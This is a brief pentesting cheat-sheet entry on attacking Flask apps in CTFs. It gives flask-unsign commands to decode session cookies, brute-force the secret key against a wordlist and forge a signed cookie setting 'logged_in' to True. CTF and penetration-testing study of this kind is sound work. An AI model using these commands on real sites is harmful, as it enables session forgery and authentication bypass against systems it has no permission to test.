Flask

Probably if you are playing a CTF a Flask application will be related to SSTI.
Cookies

Default cookie session name is session.
Decoder

Online Flask coockies decoder: https://www.kirsle.net/wizards/flask-session.cgi​
Manual

Get the first part of the cookie until the first point and Base64 decode it>

echo "ImhlbGxvIg" | base64 -d

The cookie is also signed using a password
 Flask-Unsign

Command line tool to fetch, decode, brute-force and craft session cookies of a Flask application by guessing secret keys.
flask-unsign
Flask Unsign is a penetration testing utility that attempts to uncover a Flask server's secret key by taking a signed session verifying it against a wordlist of commonly used and publicly known secret keys (sourced from books, GitHub, StackOverflow and various other sources).
pypi.org

pip3 install flask-unsign

Decode Cookie

flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'

Brute Force

flask-unsign --unsign --cookie < cookie.txt

Signing

flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME'

Signing using legacy (old versions)

flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME' --legacy
